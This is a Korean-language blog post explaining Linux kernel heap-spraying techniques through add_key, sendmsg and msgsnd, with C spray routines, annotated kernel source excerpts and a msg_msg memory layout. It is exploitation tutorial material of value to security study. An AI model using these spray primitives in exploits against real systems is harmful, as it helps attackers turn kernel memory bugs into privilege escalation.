---
layout: post
title: "Linux kernel Heap Spraying Techniques"
author: "nonetype"
categories: pwn
tags: "linux kernel exploit"
---

some Techniques to Spraying Linux kernel heap

# 목차


<!-- @import "[TOC]" {cmd="toc" depthFrom=1 depthTo=6 orderedList=true} -->
<!-- code_chunk_output -->

- [목차](#목차)
- [Heap Spraying](#heap-spraying)
- [add_key()](#add_key)
	- [Spraying Example](#spraying-example)
	- [Overview](#overview)
	- [Syscall Analysis](#syscall-analysis)
- [send[m]msg()](#sendmmsg)
	- [Spraying Example](#spraying-example-1)
	- [Overview](#overview-1)
	- [Syscall Analysis](#syscall-analysis-1)
- [msgsnd()](#msgsnd)
	- [Spraying Example](#spraying-example-2)
	- [Overview](#overview-2)
	- [Syscall Analysis](#syscall-analysis-2)
		- [do_msgsnd](#do_msgsnd)
		- [load_msg](#load_msg)
		- [alloc_msg](#alloc_msg)
	- [Allocated Memory](#allocated-memory)
- [References](#references)

<!-- /code_chunk_output -->


---

# Heap Spraying

Linux Kernel 취약점 중 UAF 혹은 Heap Overflow 취약점에 대한 Exploit code를 짜게 될 때 힙 스프레잉을 해야 하는 경우가 생기게 된다.
Linux Kernel Exploit은 userspace binary exploit과 다르게 '직접' `kmalloc`을 호출할 수 없으므로 `syscall` 호출을 통해 간접적으로 스프레잉을 진행해야 한다.
이 때 사용하는 `syscall`은 크게 3가지이다.

1. `add_key()`
2. `send[m]msg()`
3. `msgsnd()`


# add_key()

## Spraying Example
```c
void spray_addkey(int count) {
	int i;
	char payload[BUF_SIZE];
	char desc[256];
	memset(payload, 0x42, BUF_SIZE);
	for(i=0; i<count; i++) {
		sprintf(desc, "payload%d", i);
		add_key_arr[i] = _add_key("user", desc, payload, 0x300, KEY_SPEC_PROCESS_KEYRING);
	}
}
```

## Overview
`add_key` syscall 호출시 `kvmalloc` 호출[1] 후 `copy_from_user` 호출[2]을 통해 힙 영역에 사용자가 인자로 전달한 문자열을 스프레잉하게 된다.

단, 할당 후 해제되기 때문에 `userfaultfd`를 설정하는 방식[[link]](https://duasynt.com/blog/linux-kernel-heap-spray)으로 할당을 유지해줘야 한다. (thanks to jinmo123)

<!--Header의 크기는 15 Byte, 최대 할당 크기는 `1024 * 1024 - 1`[3] 이다.-->

## Syscall Analysis
```c
SYSCALL_DEFINE5(add_key, const char __user *, _type,
		const char __user *, _description,
		const void __user *, _payload,
		size_t, plen,
		key_serial_t, ringid)
{
	key_ref_t keyring_ref, key_ref;
	char type[32], *description;
	void *payload;
	long ret;

	ret = -EINVAL;
[3]	if (plen > 1024 * 1024 - 1)
		goto error;

	/* draw all the data into kernel space */
	ret = key_get_type_from_user(type, _type, sizeof(type));
	if (ret < 0)
		goto error;

	description = NULL;
	if (_description) {
		description = strndup_user(_description, KEY_MAX_DESC_SIZE);
		if (IS_ERR(description)) {
			ret = PTR_ERR(description);
			goto error;
		}
		if (!*description) {
			kfree(description);
			description = NULL;
		} else if ((description[0] == '.') &&
			   (strncmp(type, "keyring", 7) == 0)) {
			ret = -EPERM;
			goto error2;
		}
	}

	/* pull the payload in if one was supplied */
	payload = NULL;

	if (plen) {
		ret = -ENOMEM;
[1]		payload = kvmalloc(plen, GFP_KERNEL);
		if (!payload)
			goto error2;

		ret = -EFAULT;
[2]		if (copy_from_user(payload, _payload, plen) != 0)
			goto error3;
	}

	/* find the target keyring (which must be writable) */
	keyring_ref = lookup_user_key(ringid, KEY_LOOKUP_CREATE, KEY_NEED_WRITE);
	if (IS_ERR(keyring_ref)) {
		ret = PTR_ERR(keyring_ref);
		goto error3;
	}

	/* create or update the requested key and add it to the target
	 * keyring */
	key_ref = key_create_or_update(keyring_ref, type, description,
				       payload, plen, KEY_PERM_UNDEF,
				       KEY_ALLOC_IN_QUOTA);
	if (!IS_ERR(key_ref)) {
		ret = key_ref_to_ptr(key_ref)->serial;
		key_ref_put(key_ref);
	}
	else {
		ret = PTR_ERR(key_ref);
	}

	key_ref_put(keyring_ref);
 error3:
	if (payload) {
		memzero_explicit(payload, plen);
		kvfree(payload);
	}
 error2:
	kfree(description);
 error:
	return ret;
}
```

# send[m]msg()

## Spraying Example
```c
void spray_sendmsg() {
  char buf[BUF_SIZE];
  struct msghdr msg = {0};
  struct sockaddr_in addr = {0};
  int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
  memset(buf, 0x42, BUF_SIZE);

  addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
  addr.sin_family = AF_INET;
  addr.sin_port = htons(6666);

  msg.msg_control = buf;
  msg.msg_controllen = BUF_SIZE;
  msg.msg_name = (caddr_t)&addr;
  msg.msg_namelen = sizeof(addr);

  for(int i = 0; i < 100000; i++) {
    sendmsg(sockfd, &msg, 0);
  }
}
```

## Overview
`send(m)msg` syscall 호출시 `sock_kmalloc` 호출[1] 후 `copy_from_user` 호출[2]을 통해 힙 영역에 사용자가 인자로 전달한 문자열을 스프레잉하게 된다.

<!--Header의 크기는 ? Byte, 최대 할당 크기는 `INT_MAX`[3] 이다.
```c
#define INT_MAX			((int)(~0U>>1))
```
-->

## Syscall Analysis
```c
static int ___sys_sendmsg(struct socket *sock, struct user_msghdr __user *msg,
			 struct msghdr *msg_sys, unsigned int flags,
			 struct used_address *used_address,
			 unsigned int allowed_msghdr_flags)
{
	...

[3]  if (msg_sys->msg_controllen > INT_MAX)
		goto out_freeiov;
	flags |= (msg_sys->msg_flags & allowed_msghdr_flags);
	ctl_len = msg_sys->msg_controllen;
	if ((MSG_CMSG_COMPAT & flags) && ctl_len) {
		err =
		    cmsghdr_from_user_compat_to_kern(msg_sys, sock->sk, ctl,
						     sizeof(ctl));
		if (err)
			goto out_freeiov;
		ctl_buf = msg_sys->msg_control;
		ctl_len = msg_sys->msg_controllen;
	} else if (ctl_len) {
		BUILD_BUG_ON(sizeof(struct cmsghdr) !=
			     CMSG_ALIGN(sizeof(struct cmsghdr)));
		if (ctl_len > sizeof(ctl)) {
[1]			ctl_buf = sock_kmalloc(sock->sk, ctl_len, GFP_KERNEL);
			if (ctl_buf == NULL)
				goto out_freeiov;
		}
		err = -EFAULT;
		/*
		 * Careful! Before this, msg_sys->msg_control contains a user pointer.
		 * Afterwards, it will be a kernel pointer. Thus the compiler-assisted
		 * checking falls down on this.
		 */
[2]		if (copy_from_user(ctl_buf,
				   (void __user __force *)msg_sys->msg_control,
				   ctl_len))
			goto out_freectl;
		msg_sys->msg_control = ctl_buf;
	}
	msg_sys->msg_flags = flags;
  ...
```

# msgsnd()

## Spraying Example
```c
void spray_msgsnd(int count) {
	int i;
	for(i=0; i<count; i++) {
		int msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
		struct {
			long mtype;
			char mtext[BUF_SIZE];
		} msg;

		memset(msg.mtext, 0x42, BUF_SIZE-1);
		msg.mtype = 1;

		if(flag != 0)
		  return;
		if(msgsnd(msqid, &msg, sizeof(msg.mtext), 0) < 0){
			perror("msgsnd");
		}
	}
	return;
}
```

## Overview
`msgsnd` syscall 호출시 `load_msg` 호출[1], `alloc_msg` 호출[2], `kmalloc` 호출[3]을 통해 동적 메모리 할당 후 `copy_from_user` 호출[4]을 통해 힙 영역에 사용자가 인자로 전달한 문자열을 스프레잉하게 된다.

<!--Header의 크기는 0x30 Byte, 최대 할당 크기는 `INT_MAX`[3] 이다.-->

## Syscall Analysis

### do_msgsnd
```c
static long do_msgsnd(int msqid, long mtype, void __user *mtext,
		size_t msgsz, int msgflg)
{
	struct msg_queue *msq;
	struct msg_msg *msg;
	int err;
	struct ipc_namespace *ns;
	DEFINE_WAKE_Q(wake_q);

	ns = current->nsproxy->ipc_ns;

	if (msgsz > ns->msg_ctlmax || (long) msgsz < 0 || msqid < 0)
		return -EINVAL;
	if (mtype < 1)
		return -EINVAL;

[1]	msg = load_msg(mtext, msgsz);
	if (IS_ERR(msg))
		return PTR_ERR(msg);

	msg->m_type = mtype;
	msg->m_ts = msgsz;
  ...
```

### load_msg
```c
struct msg_msg *load_msg(const void __user *src, size_t len)
{
	struct msg_msg *msg;
	struct msg_msgseg *seg;
	int err = -EFAULT;
	size_t alen;

[2]	msg = alloc_msg(len);
	if (msg == NULL)
		return ERR_PTR(-ENOMEM);

	alen = min(len, DATALEN_MSG);
[4]	if (copy_from_user(msg + 1, src, alen))
		goto out_err;
```

### alloc_msg
```c
static struct msg_msg *alloc_msg(size_t len)
{
	struct msg_msg *msg;
	struct msg_msgseg **pseg;
	size_t alen;

	alen = min(len, DATALEN_MSG);
[3]	msg = kmalloc(sizeof(*msg) + alen, GFP_KERNEL_ACCOUNT);
	if (msg == NULL)
		return NULL;
```

## Allocated Memory
`+0x00`, `+0x08`은 이전, 다음 msg를 가르키는 이중 연결 리스트 포인터

`+0x10`은 msg type

`+0x18`은 msg size

`+0x20`은 `struct msg_msgseg *next` (정확히 무슨 용도인지는 모르겠다.)

`+0x28`은 `void *security` (용도는 똑같이 모르겠다.)

`+0x30`이후 할당한 문자열이 존재한다.
```
0x000000: ff 00 00 30 0b 10 00 00 00 74 aa 7b 00 88 ff ff ...0.....t.{....
0x000010: 01 00 00 00 00 00 00 00 00 03 00 00 00 00 00 00 ................
0x000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
0x000030: 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 BBBBBBBBBBBBBBBB
```

# References
Linux Kernel universal heap spray | <https://duasynt.com/blog/linux-kernel-heap-spray>
twitter@Vitaly - add_key() | <https://twitter.com/vnik5287/status/806778450304319489>
Dissecting a 17-year-old kernel bug | <https://cdn2.hubspot.net/hubfs/2518562/beVX/bevx-Dissecting-a-17-year-old-Vitaly-Nikolenko.pdf>
CVE-2017-2636: exploit the race condition in the n_hdlc Linux kernel driver bypassing SMEP | <https://a13xp0p0v.github.io/2017/03/24/CVE-2017-2636.html>
